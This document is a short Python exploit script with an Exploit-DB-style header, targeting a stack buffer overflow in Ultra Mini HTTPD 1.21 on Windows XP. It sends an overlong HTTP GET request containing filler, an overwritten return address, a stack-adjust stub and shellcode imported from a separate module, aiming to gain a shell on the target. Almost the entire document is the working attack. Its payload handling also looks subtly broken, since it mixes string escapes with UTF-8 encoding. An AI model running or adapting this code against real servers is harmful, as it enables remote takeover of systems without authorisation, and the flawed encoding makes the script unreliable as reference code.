# Exploit Title: Ultra Mini HTTPD stack buffer overflow
# Date: 10 July 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.picolix.jp/
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Version: 1.21
# Tested on: Windows XP Professional SP2, English
#
# Description: 
# A buffer overflow is triggered when requesting a very long 
# resource name. 
#

import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):	
	try:
		payload =  "A" * 5392 + struct.pack("<I", 0x7C941EED)
		payload += "\x81\xc4\xf0\xea\xff\xff" + str(buf) + "B" * 4230
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_machine, target_port))

		buffer = "GET /" + payload + " HTTP/1.1\r\n" + "Host: "+target_machine + "\r\n\r\n"
		# buffer= bytes(buffer, 'ascii')
		buffer = bytes(buffer, 'utf-8')
		s.send(buffer)
		s.close()
	except:
		print("Not connected")		